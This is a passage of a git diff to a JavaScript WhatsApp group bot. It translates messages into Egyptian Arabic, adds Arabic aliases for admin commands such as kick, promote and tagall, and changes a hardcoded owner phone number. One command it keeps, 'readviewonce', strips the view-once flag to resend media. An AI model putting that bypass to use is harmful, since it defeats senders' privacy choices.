 if (!XeonTheCreator) return XeonStickOwner()
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
+if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 201121968769`)
 ya = q.split("|")[0].replace(/[^0-9]/g, '')
 unp = owner.indexOf(ya)
 owner.splice(unp, 1)
@@ -14352,7 +14347,7 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
         },
         interactiveMessage: proto.Message.InteractiveMessage.create({
           body: proto.Message.InteractiveMessage.Body.create({
-            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
+            text: `اهلا ${m.pushName}\nبص يزميلي هتدوس علي زرار ال تحت ده وتختار عايز تفعل ميزه _*${command}*_ ولا لا ❤️🔥.“`
           }),
           footer: proto.Message.InteractiveMessage.Footer.create({
             text: botname
@@ -14368,16 +14363,16 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
             buttons: [
               {
                 "name": "single_select",
-                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE",
-"sections":[{"title":"CHOOSE ENABLE/DISABLE",
-"rows":[{"header":"ENABLE ✅",
-"title":"CHOOSE ",
-"description":"ENABLE ✅",
-"id":"${prefix+command} on"},
-{"header":"DISABLE ❌",
-"title":"CHOOSE ",
-"description":"DISABLE ❌",
-"id":"${prefix+command} off"}
+                "buttonParamsJson": `{"title":"اختار هتفعل ولا هتقفل 🤔❤️.",
+"sections":[{"title":"هتفعل/هتقفل",
+"rows":[{"header":"فعل ✅",
+"title":" ",
+"description":"فعل ✅",
+"id":"${command} فعل"},
+{"header":"اقفل ❌",
+"title":" ",
+"description":"اقفل ❌",
+"id":"${command} اقفل"}
 ]
 }
 ]
@@ -14449,7 +14444,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
         },
         interactiveMessage: proto.Message.InteractiveMessage.create({
           body: proto.Message.InteractiveMessage.Body.create({
-            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
+            text: `اهلا ${m.pushName}\nبص يزميلي هتدوس علي زرار ال تحت ده وتختار عايز تفعل ميزه _*${command}*_ ولا لا ❤️🔥.“`
           }),
           footer: proto.Message.InteractiveMessage.Footer.create({
             text: botname
@@ -14465,16 +14460,16 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             buttons: [
               {
                 "name": "single_select",
-                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE",
-"sections":[{"title":"CHOOSE ENABLE/DISABLE",
-"rows":[{"header":"ENABLE ✅",
-"title":"CHOOSE ",
-"description":"ENABLE ✅",
-"id":"${prefix+command} on"},
-{"header":"DISABLE ❌",
-"title":"CHOOSE ",
-"description":"DISABLE ❌",
-"id":"${prefix+command} off"}
+                "buttonParamsJson": `{"title":"اختار هتفعل ولا هتقفل 🤔❤️.",
+"sections":[{"title":"هتفعل/هتقفل",
+"rows":[{"header":"فعل ✅",
+"title":" ",
+"description":"فعل ✅",
+"id":"${command} فعل"},
+{"header":"اقفل ❌",
+"title":" ",
+"description":"اقفل ❌",
+"id":"${command} اقفل"}
 ]
 }
 ]
@@ -14521,7 +14516,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
         },
         interactiveMessage: proto.Message.InteractiveMessage.create({
           body: proto.Message.InteractiveMessage.Body.create({
-            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
+            text: `اهلا ${m.pushName}\nبص يزميلي هتدوس علي زرار ال تحت ده وتختار عايز تفعل ميزه _*${command}*_ ولا لا ❤️🔥.“`
           }),
           footer: proto.Message.InteractiveMessage.Footer.create({
             text: botname
@@ -14537,16 +14532,16 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             buttons: [
               {
                 "name": "single_select",
-                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE",
-"sections":[{"title":"CHOOSE ENABLE/DISABLE",
-"rows":[{"header":"ENABLE ✅",
-"title":"CHOOSE ",
-"description":"ENABLE ✅",
-"id":"${prefix+command} on"},
-{"header":"DISABLE ❌",
-"title":"CHOOSE ",
-"description":"DISABLE ❌",
-"id":"${prefix+command} off"}
+                "buttonParamsJson": `{"title":"اختار هتفعل ولا هتقفل 🤔❤️.",
+"sections":[{"title":"هتفعل/هتقفل",
+"rows":[{"header":"فعل ✅",
+"title":" ",
+"description":"فعل ✅",
+"id":"${command} فعل"},
+{"header":"اقفل ❌",
+"title":" ",
+"description":"اقفل ❌",
+"id":"${command} اقفل"}
 ]
 }
 ]
@@ -14593,7 +14588,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
         },
         interactiveMessage: proto.Message.InteractiveMessage.create({
           body: proto.Message.InteractiveMessage.Body.create({
-            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
+            text: `اهلا ${m.pushName}\nبص يزميلي هتدوس علي زرار ال تحت ده وتختار عايز تفعل ميزه _*${command}*_ ولا لا ❤️🔥.“`
           }),
           footer: proto.Message.InteractiveMessage.Footer.create({
             text: botname
@@ -14609,16 +14604,16 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             buttons: [
               {
                 "name": "single_select",
-                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE",
-"sections":[{"title":"CHOOSE ENABLE/DISABLE",
-"rows":[{"header":"ENABLE ✅",
-"title":"CHOOSE ",
-"description":"ENABLE ✅",
-"id":"${prefix+command} on"},
-{"header":"DISABLE ❌",
-"title":"CHOOSE ",
-"description":"DISABLE ❌",
-"id":"${prefix+command} off"}
+                "buttonParamsJson": `{"title":"اختار هتفعل ولا هتقفل 🤔❤️.",
+"sections":[{"title":"هتفعل/هتقفل",
+"rows":[{"header":"فعل ✅",
+"title":" ",
+"description":"فعل ✅",
+"id":"${command} فعل"},
+{"header":"اقفل ❌",
+"title":" ",
+"description":"اقفل ❌",
+"id":"${command} اقفل"}
 ]
 }
 ]
@@ -14665,7 +14660,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
         },
         interactiveMessage: proto.Message.InteractiveMessage.create({
           body: proto.Message.InteractiveMessage.Body.create({
-            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
+            text: `اهلا ${m.pushName}\nبص يزميلي هتدوس علي زرار ال تحت ده وتختار عايز تفعل ميزه _*${command}*_ ولا لا ❤️🔥.“`
           }),
           footer: proto.Message.InteractiveMessage.Footer.create({
             text: botname
@@ -14681,16 +14676,16 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             buttons: [
               {
                 "name": "single_select",
-                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE",
-"sections":[{"title":"CHOOSE ENABLE/DISABLE",
-"rows":[{"header":"ENABLE ✅",
-"title":"CHOOSE ",
-"description":"ENABLE ✅",
-"id":"${prefix+command} on"},
-{"header":"DISABLE ❌",
-"title":"CHOOSE ",
-"description":"DISABLE ❌",
-"id":"${prefix+command} off"}
+                "buttonParamsJson": `{"title":"اختار هتفعل ولا هتقفل 🤔❤️.",
+"sections":[{"title":"هتفعل/هتقفل",
+"rows":[{"header":"فعل ✅",
+"title":" ",
+"description":"فعل ✅",
+"id":"${command} فعل"},
+{"header":"اقفل ❌",
+"title":" ",
+"description":"اقفل ❌",
+"id":"${command} اقفل"}
 ]
 }
 ]
@@ -14737,7 +14732,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
         },
         interactiveMessage: proto.Message.InteractiveMessage.create({
           body: proto.Message.InteractiveMessage.Body.create({
-            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
+            text: `اهلا ${m.pushName}\nبص يزميلي هتدوس علي زرار ال تحت ده وتختار عايز تفعل ميزه _*${command}*_ ولا لا ❤️🔥.“`
           }),
           footer: proto.Message.InteractiveMessage.Footer.create({
             text: botname
@@ -14753,16 +14748,16 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             buttons: [
               {
                 "name": "single_select",
-                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE",
-"sections":[{"title":"CHOOSE ENABLE/DISABLE",
-"rows":[{"header":"ENABLE ✅",
-"title":"CHOOSE ",
-"description":"ENABLE ✅",
-"id":"${prefix+command} on"},
-{"header":"DISABLE ❌",
-"title":"CHOOSE ",
-"description":"DISABLE ❌",
-"id":"${prefix+command} off"}
+                "buttonParamsJson": `{"title":"اختار هتفعل ولا هتقفل 🤔❤️.",
+"sections":[{"title":"هتفعل/هتقفل",
+"rows":[{"header":"فعل ✅",
+"title":" ",
+"description":"فعل ✅",
+"id":"${command} فعل"},
+{"header":"اقفل ❌",
+"title":" ",
+"description":"اقفل ❌",
+"id":"${command} اقفل"}
 ]
 }
 ]
@@ -14822,7 +14817,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
         },
         interactiveMessage: proto.Message.InteractiveMessage.create({
           body: proto.Message.InteractiveMessage.Body.create({
-            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
+            text: `اهلا ${m.pushName}\nبص يزميلي هتدوس علي زرار ال تحت ده وتختار عايز تفعل ميزه _*${command}*_ ولا لا ❤️🔥.“`
           }),
           footer: proto.Message.InteractiveMessage.Footer.create({
             text: botname
@@ -14838,16 +14833,16 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             buttons: [
               {
                 "name": "single_select",
-                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE",
-"sections":[{"title":"CHOOSE ENABLE/DISABLE",
-"rows":[{"header":"ENABLE ✅",
-"title":"CHOOSE ",
-"description":"ENABLE ✅",
-"id":"${prefix+command} on"},
-{"header":"DISABLE ❌",
-"title":"CHOOSE ",
-"description":"DISABLE ❌",
-"id":"${prefix+command} off"}
+                "buttonParamsJson": `{"title":"اختار هتفعل ولا هتقفل 🤔❤️.",
+"sections":[{"title":"هتفعل/هتقفل",
+"rows":[{"header":"فعل ✅",
+"title":" ",
+"description":"فعل ✅",
+"id":"${command} فعل"},
+{"header":"اقفل ❌",
+"title":" ",
+"description":"اقفل ❌",
+"id":"${command} اقفل"}
 ]
 }
 ]
@@ -14895,7 +14890,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
         },
         interactiveMessage: proto.Message.InteractiveMessage.create({
           body: proto.Message.InteractiveMessage.Body.create({
-            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
+            text: `اهلا ${m.pushName}\nبص يزميلي هتدوس علي زرار ال تحت ده وتختار عايز تفعل ميزه _*${command}*_ ولا لا ❤️🔥.“`
           }),
           footer: proto.Message.InteractiveMessage.Footer.create({
             text: botname
@@ -14911,16 +14906,16 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             buttons: [
               {
                 "name": "single_select",
-                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE",
-"sections":[{"title":"CHOOSE ENABLE/DISABLE",
-"rows":[{"header":"ENABLE ✅",
-"title":"CHOOSE ",
-"description":"ENABLE ✅",
-"id":"${prefix+command} on"},
-{"header":"DISABLE ❌",
-"title":"CHOOSE ",
-"description":"DISABLE ❌",
-"id":"${prefix+command} off"}
+                "buttonParamsJson": `{"title":"اختار هتفعل ولا هتقفل 🤔❤️.",
+"sections":[{"title":"هتفعل/هتقفل",
+"rows":[{"header":"فعل ✅",
+"title":" ",
+"description":"فعل ✅",
+"id":"${command} فعل"},
+{"header":"اقفل ❌",
+"title":" ",
+"description":"اقفل ❌",
+"id":"${command} اقفل"}
 ]
 }
 ]
@@ -14968,7 +14963,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
         },
         interactiveMessage: proto.Message.InteractiveMessage.create({
           body: proto.Message.InteractiveMessage.Body.create({
-            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
+            text: `اهلا ${m.pushName}\nبص يزميلي هتدوس علي زرار ال تحت ده وتختار عايز تفعل ميزه _*${command}*_ ولا لا ❤️🔥.“`
           }),
           footer: proto.Message.InteractiveMessage.Footer.create({
             text: botname
@@ -14984,16 +14979,16 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             buttons: [
               {
                 "name": "single_select",
-                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE",
-"sections":[{"title":"CHOOSE ENABLE/DISABLE",
-"rows":[{"header":"ENABLE ✅",
-"title":"CHOOSE ",
-"description":"ENABLE ✅",
-"id":"${prefix+command} on"},
-{"header":"DISABLE ❌",
-"title":"CHOOSE ",
-"description":"DISABLE ❌",
-"id":"${prefix+command} off"}
+                "buttonParamsJson": `{"title":"اختار هتفعل ولا هتقفل 🤔❤️.",
+"sections":[{"title":"هتفعل/هتقفل",
+"rows":[{"header":"فعل ✅",
+"title":" ",
+"description":"فعل ✅",
+"id":"${command} فعل"},
+{"header":"اقفل ❌",
+"title":" ",
+"description":"اقفل ❌",
+"id":"${command} اقفل"}
 ]
 }
 ]
@@ -15040,7 +15035,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
         },
         interactiveMessage: proto.Message.InteractiveMessage.create({
           body: proto.Message.InteractiveMessage.Body.create({
-            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
+            text: `اهلا ${m.pushName}\nبص يزميلي هتدوس علي زرار ال تحت ده وتختار عايز تفعل ميزه _*${command}*_ ولا لا ❤️🔥.“`
           }),
           footer: proto.Message.InteractiveMessage.Footer.create({
             text: botname
@@ -15056,16 +15051,16 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             buttons: [
               {
                 "name": "single_select",
-                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE",
-"sections":[{"title":"CHOOSE ENABLE/DISABLE",
-"rows":[{"header":"ENABLE ✅",
-"title":"CHOOSE ",
-"description":"ENABLE ✅",
-"id":"${prefix+command} on"},
-{"header":"DISABLE ❌",
-"title":"CHOOSE ",
-"description":"DISABLE ❌",
-"id":"${prefix+command} off"}
+                "buttonParamsJson": `{"title":"اختار هتفعل ولا هتقفل 🤔❤️.",
+"sections":[{"title":"هتفعل/هتقفل",
+"rows":[{"header":"فعل ✅",
+"title":" ",
+"description":"فعل ✅",
+"id":"${command} فعل"},
+{"header":"اقفل ❌",
+"title":" ",
+"description":"اقفل ❌",
+"id":"${command} اقفل"}
 ]
 }
 ]
@@ -15112,7 +15107,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
         },
         interactiveMessage: proto.Message.InteractiveMessage.create({
           body: proto.Message.InteractiveMessage.Body.create({
-            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
+            text: `اهلا ${m.pushName}\nبص يزميلي هتدوس علي زرار ال تحت ده وتختار عايز تفعل ميزه _*${command}*_ ولا لا ❤️🔥.“`
           }),
           footer: proto.Message.InteractiveMessage.Footer.create({
             text: botname
@@ -15128,16 +15123,16 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             buttons: [
               {
                 "name": "single_select",
-                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE",
-"sections":[{"title":"CHOOSE ENABLE/DISABLE",
-"rows":[{"header":"ENABLE ✅",
-"title":"CHOOSE ",
-"description":"ENABLE ✅",
-"id":"${prefix+command} on"},
-{"header":"DISABLE ❌",
-"title":"CHOOSE ",
-"description":"DISABLE ❌",
-"id":"${prefix+command} off"}
+                "buttonParamsJson": `{"title":"اختار هتفعل ولا هتقفل 🤔❤️.",
+"sections":[{"title":"هتفعل/هتقفل",
+"rows":[{"header":"فعل ✅",
+"title":" ",
+"description":"فعل ✅",
+"id":"${command} فعل"},
+{"header":"اقفل ❌",
+"title":" ",
+"description":"اقفل ❌",
+"id":"${command} اقفل"}
 ]
 }
 ]
@@ -15183,7 +15178,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
         },
         interactiveMessage: proto.Message.InteractiveMessage.create({
           body: proto.Message.InteractiveMessage.Body.create({
-            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
+            text: `اهلا ${m.pushName}\nبص يزميلي هتدوس علي زرار ال تحت ده وتختار عايز تفعل ميزه _*${command}*_ ولا لا ❤️🔥.“`
           }),
           footer: proto.Message.InteractiveMessage.Footer.create({
             text: botname
@@ -15199,16 +15194,16 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             buttons: [
               {
                 "name": "single_select",
-                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE",
-"sections":[{"title":"CHOOSE ENABLE/DISABLE",
-"rows":[{"header":"ENABLE ✅",
-"title":"CHOOSE ",
-"description":"ENABLE ✅",
-"id":"${prefix+command} on"},
-{"header":"DISABLE ❌",
-"title":"CHOOSE ",
-"description":"DISABLE ❌",
-"id":"${prefix+command} off"}
+                "buttonParamsJson": `{"title":"اختار هتفعل ولا هتقفل 🤔❤️.",
+"sections":[{"title":"هتفعل/هتقفل",
+"rows":[{"header":"فعل ✅",
+"title":" ",
+"description":"فعل ✅",
+"id":"${command} فعل"},
+{"header":"اقفل ❌",
+"title":" ",
+"description":"اقفل ❌",
+"id":"${command} اقفل"}
 ]
 }
 ]
@@ -15255,7 +15250,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
         },
         interactiveMessage: proto.Message.InteractiveMessage.create({
           body: proto.Message.InteractiveMessage.Body.create({
-            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
+            text: `اهلا ${m.pushName}\nبص يزميلي هتدوس علي زرار ال تحت ده وتختار عايز تفعل ميزه _*${command}*_ ولا لا ❤️🔥.“`
           }),
           footer: proto.Message.InteractiveMessage.Footer.create({
             text: botname
@@ -15271,16 +15266,16 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             buttons: [
               {
                 "name": "single_select",
-                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE",
-"sections":[{"title":"CHOOSE ENABLE/DISABLE",
-"rows":[{"header":"ENABLE ✅",
-"title":"CHOOSE ",
-"description":"ENABLE ✅",
-"id":"${prefix+command} on"},
-{"header":"DISABLE ❌",
-"title":"CHOOSE ",
-"description":"DISABLE ❌",
-"id":"${prefix+command} off"}
+                "buttonParamsJson": `{"title":"اختار هتفعل ولا هتقفل 🤔❤️.",
+"sections":[{"title":"هتفعل/هتقفل",
+"rows":[{"header":"فعل ✅",
+"title":" ",
+"description":"فعل ✅",
+"id":"${command} فعل"},
+{"header":"اقفل ❌",
+"title":" ",
+"description":"اقفل ❌",
+"id":"${command} اقفل"}
 ]
 }
 ]
@@ -15334,7 +15329,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                 	}
                 }
                 break
-			case 'setbio': case 'setbotbio': {
+			case 'setbio': case 'غير-بايو-بتاعك': {
 				if (!XeonTheCreator) return XeonStickOwner()
 				if (!text) return replygcxeon(`Where's the text??`)
 				XeonBotInc.setStatus(q)
@@ -15343,7 +15338,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 			break
 			case 'setbotpp':
             case 'setpp':
-            case 'setpp':
+            case 'غير-صورتك':
             case 'setppbot':
                 if (!XeonTheCreator) return XeonStickOwner()
                 if (!quoted) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
@@ -15494,7 +15489,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 			break
 			
 			// Group Menu
-			case 'add': {
+			case 'add': case 'ضيف': {
 				if (!m.isGroup) return XeonStickGroup()
 				if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
 				if (!m.isBotAdmin) return XeonStickBotAdmin()
@@ -15512,7 +15507,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 								if (i.status == 500) return replygcxeon('Group Full!')
 								if (i.status == 403) {
 									await XeonBotInc.sendMessage(m.chat, { text: `@${numbersOnly.split('@')[0]} Cannot Be Added\n\nBecause Target Private\n\nInvitations will be sent to\n-> wa.me/${numbersOnly.replace(/\D/g, '')}\nVia Private Chat`, mentions: [numbersOnly] }, { quoted : m })
-									await XeonBotInc.sendMessage(`${numbersOnly ? numbersOnly : '916909137213@s.whatsapp.net'}`, { text: `${'https://chat.whatsapp.com/' + invv}\n------------------------------------------------------\n\nAdmin: wa.me/${m.sender}\nInvite you to this group\nPlease enter if you wish🙇`, detectLink: true, mentions: [numbersOnly] }, { quoted : floc2 }).catch((err) => replygcxeon('Failed to Send Invitation!'))
+									await XeonBotInc.sendMessage(`${numbersOnly ? numbersOnly : '201121968769@s.whatsapp.net'}`, { text: `${'https://chat.whatsapp.com/' + invv}\n------------------------------------------------------\n\nAdmin: wa.me/${m.sender}\nInvite you to this group\nPlease enter if you wish🙇`, detectLink: true, mentions: [numbersOnly] }, { quoted : floc2 }).catch((err) => replygcxeon('Failed to Send Invitation!'))
 								} else {
 									replygcxeon('Success!!')
 								}
@@ -15524,7 +15519,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 				}
 			}
 			break
-			case 'kick': {
+			case 'kick': case 'طرد': {
 				if (!m.isGroup) return XeonStickGroup()
 				if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
 				if (!m.isBotAdmin) return XeonStickBotAdmin()
@@ -15536,7 +15531,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 				}
 			}
 			break
-			case 'promote': {
+			case 'promote': case 'مشرف': {
 				if (!m.isGroup) return XeonStickGroup()
 				if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
 				if (!m.isBotAdmin) return XeonStickBotAdmin()
@@ -15549,7 +15544,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 				}
 			}
 			break
-			case 'demote': {
+			case 'demote': case 'نزلو': {
 				if (!m.isGroup) return XeonStickGroup()
 				if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
 				if (!m.isBotAdmin) return XeonStickBotAdmin()
@@ -15562,32 +15557,32 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 				}
 			}
 			break
-			case 'setnamegc': case 'setsubject': case 'setname': case 'setnamegc': case 'setsubject': case 'setsubjectgc': {
+			case 'setnamegc': case 'اسم-الجروب': case 'اسم-جروب': {
 				if (!m.isGroup) return XeonStickGroup()
 				if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
 				if (!m.isBotAdmin) return XeonStickBotAdmin()
 				if (!text && !m.quoted) {
-					replygcxeon(`Example: ${prefix + command} text`)
+					replygcxeon(`مثال: ${command} خوفو ص المزعجين`)
 				} else {
 					const teksnya = text ? text : m.quoted.text
 					await XeonBotInc.groupUpdateSubject(m.chat, teksnya).catch((err) => replygcxeon('Fail!'))
 				}
 			}
 			break
-			case 'setdesc': case 'setdescgc': case 'setdesk': case 'setdeskgc': {
+			case 'setdesc': case 'setdescgc': case 'بايو-جروب': case 'بايو-الجروب': {
 				if (!m.isGroup) return XeonStickGroup()
 				if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
 				if (!m.isBotAdmin) return XeonStickBotAdmin()
 				if (!text && !m.quoted) {
-					replygcxeon(`Example: ${prefix + command} textnya`)
+					replygcxeon(`مثال: ${command} خوفو`)
 				} else {
 					const teksnya = text ? text : m.quoted.text
 					await XeonBotInc.groupUpdateDescription(m.chat, teksnya).catch((err) => replygcxeon('Fail!'))
 				}
 			}
 			break
-			case 'setppgroup':
-            case 'setppgrup':
+			case 'صوره-الجروب':
+            case 'صوره-جروب':
             case 'setppgc':
             case 'setgrouppp':
             case 'setgruppp':
@@ -15595,9 +15590,9 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                 if (!m.isGroup) return XeonStickGroup()
                 if (!m.isAdmin && !XeonTheCreator) return replygcxeon(mess.admin)
                 if (!m.isBotAdmin) return XeonStickBotAdmin()
-                if (!quoted) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
-                if (!/image/.test(mime)) return replygcxeon(`Send/Reply Image Caption Caption ${prefix + command}`)
-                if (/webp/.test(mime)) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
+                if (!quoted) return replygcxeon(`اعمل ريب يصديقي علي صوره وكتب  ${command}`)
+                if (!/image/.test(mime)) return replygcxeon(`اعمل ريب يصديقي علي صوره وكتب  ${command}`)
+                if (/webp/.test(mime)) return replygcxeon(`اعمل ريب يصديقي علي صوره وكتب  ${command}`)
                 var medis = await XeonBotInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                 if (args[0] == 'full') {
                     var {
@@ -15628,8 +15623,9 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                     replygcxeon(mess.done)
                 }
                 break
-			case 'delete': case 'del': case 'd': {
-				if (!m.quoted) return replygcxeon('Reply to the message you want to delete')
+			case 'امسح': {
+			if (!m.isBotAdmin) return XeonStickBotAdmin()
+				if (!m.quoted) return replygcxeon('عايزني امسح اي يصديقي 💗🌝.“')
 				await XeonBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: m.isBotAdmin ? false : true, id: m.quoted.id, participant: m.quoted.sender }})
 			}
 			break
@@ -15676,7 +15672,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 				}
 			}
 			break
-			case 'deleteppgroup': case 'delppgc': case 'deleteppgc': case 'delppgroup': {
+			case 'امسح-صوره-جروب': case 'delppgroup': {
 if (!m.isGroup) return XeonStickGroup()
 if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
 if (!m.isBotAdmin) return XeonStickBotAdmin()
@@ -15718,7 +15714,7 @@ if (!XeonTheCreator) return XeonStickOwner()
 				}
 			}
 			break
-			case 'tagall': {
+			case 'tagall': case 'منشن': {
 				if (!m.isGroup) return XeonStickGroup()
 				if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
 				if (!m.isBotAdmin) return XeonStickBotAdmin()
@@ -15729,14 +15725,14 @@ if (!XeonTheCreator) return XeonStickOwner()
 				await XeonBotInc.sendMessage(m.chat, { text: teks, mentions: m.metadata.participants.map(a => a.id) }, { quoted: m })
 			}
 			break
-			case 'hidetag': case 'h': {
+			case 'hidetag': case 'منشن-خفي': {
 				if (!m.isGroup) return XeonStickGroup()
 				if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
 				if (!m.isBotAdmin) return XeonStickBotAdmin()
 				XeonBotInc.sendMessage(m.chat, { text : q ? q : '' , mentions: m.metadata.participants.map(a => a.id)}, { quoted: m })
 			}
 			break
-			case 'totag': {
+			case 'اعملها-منشن': {
 				if (!m.isGroup) return XeonStickGroup()
 				if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
 				if (!m.isBotAdmin) return XeonStickBotAdmin()
@@ -15782,10 +15778,10 @@ list.push({
                 })
             }
             break
-			case 'profile': case 'cekme': case 'cek': {
+			case 'profile': case 'حسابي': case 'cek': {
 				const user = Object.keys(global.db.users)
 				const infoUser = global.db.users[m.sender]
-				const teks = `*Profile @${m.sender.split('@')[0]}* :\nUser Bot : ${user.includes(m.sender) ? 'True' : 'False'}\nUser : ${isVip ? 'VIP' : isPremium ? 'PREMIUM' : 'FREE'}\nLimit : ${infoUser.limit}\nMoney : ${infoUser ? infoUser.uang.toLocaleString('id-ID') : '0'}`
+				const teks = `*حسابك ي @${m.sender.split('@')[0]}* :\nمستخدم : ${isVip ? 'VIP' : isPremium ? 'مميز' : 'عادي'}\nمحاولاتك : ${infoUser.limit}\nرصيد حسابك : ${infoUser ? infoUser.uang.toLocaleString('id-ID') : '0'}`
 				await XeonBotInc.sendTextMentions(m.chat, teks, m)
 			}
 			break
@@ -15878,7 +15874,7 @@ list.push({
 				replygcxeon(`@${m.sender.split('@')[0]} Been Afk ${text ? ': ' + text : ''}`)
 			}
 			break
-			case 'readviewonce': case 'readviewone': case 'rvo': {
+			case 'readviewonce': case 'readviewone': case 'وريني-صوره': {
 				if (!m.quoted) return replygcxeon(`Reply view once message\nExample: ${prefix + command}`)
 				if (m.quoted.msg.viewOnce) {
 					m.quoted.msg.viewOnce = false
@@ -16851,7 +16847,7 @@ break
 				}
 			}
 			break
-			case 'playbomb': case 'bomb': {
+			case 'لعبه-كتاكيت': case 'bomb': {
 				if (game.tebakbom[m.sender]) return replygcxeon('There Are Still Unfinished Sessions!')
 				function shuffle(array) {
 					return array.sort(() => Math.random() - 0.5);
@@ -16866,9 +16862,9 @@ break
 					waktu: setTimeout(() => {
 						if (game.tebakbom[m.sender]) replygcxeon(`_Time ${command} finished_`)
 						delete game.tebakbom[m.sender];
-					}, 120000)
+					}, 900000)
 				}
-				replygcxeon(`*GUESS THE BOMB*\n\n${game.tebakbom[m.sender].board.join("")}\n\nChoose that number! and don't get hit by a bomb!\nBomb : ${game.tebakbom[m.sender].bomb}\nLife : ${game.tebakbom[m.sender].nyawa.join("")}`);
+				replygcxeon(`*لعبه الكتاكيت 😂*\n\n${game.tebakbom[m.sender].board.join("")}\n\nبص يزميلي انت هتختار رقم من الارقام ال فوق ونت وحظك لازم تتطلع 7كتاكيت لو طلعلك بيض هتخسر قلب ونت معاك 3قلوب خلصانه 🤔❤️.\n*البيض* : ${game.tebakbom[m.sender].bomb}\n*القلوب* : ${game.tebakbom[m.sender].nyawa.join("")}`);
 			}
 			break
 			case 'mathquiz': case 'math': {
@@ -16918,7 +16914,7 @@ break
                 ...(await prepareWAMessageMedia({ image : fs.readFileSync('./GlobalMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                   title: ``,
                   gifPlayback: true,
-                  subtitle: ownername,
+                  subtitle: namegroupp,
